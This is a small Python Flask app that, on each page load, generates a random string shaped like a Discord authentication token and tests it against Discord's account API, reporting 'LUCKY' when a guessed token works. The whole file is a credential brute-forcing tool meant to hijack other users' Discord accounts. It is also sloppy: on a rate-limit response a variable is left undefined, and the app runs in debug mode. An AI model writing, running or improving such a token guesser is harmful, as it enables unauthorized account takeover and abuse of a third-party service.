import flask
import string
import random

from requests import get, post
from random import randint
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
	notvalid = "NotValid"
	valid = "Valid"

	chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890-_'

	one = ''.join((random.choice(chars) for i in range(24)))
	two = ''.join((random.choice(chars) for i in range(7)))
	three = ''.join((random.choice(chars) for i in range(randint(27, 38))))

	token = f"{one}.{two}.{three}"

	r=get('https://discord.com/api/v9/users/@me',headers={"Authorization": token})
	if r.status_code == 200:
		print(f"what?")
		token1 = "LUCKY"
	elif r.status_code == 429:
		print(f"LIMIT")
	else:
		print(f"notvalid")
		token1 = "bad luck"

	return render_template('index.html',token=token, token1=token1)

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


app.run(debug=True)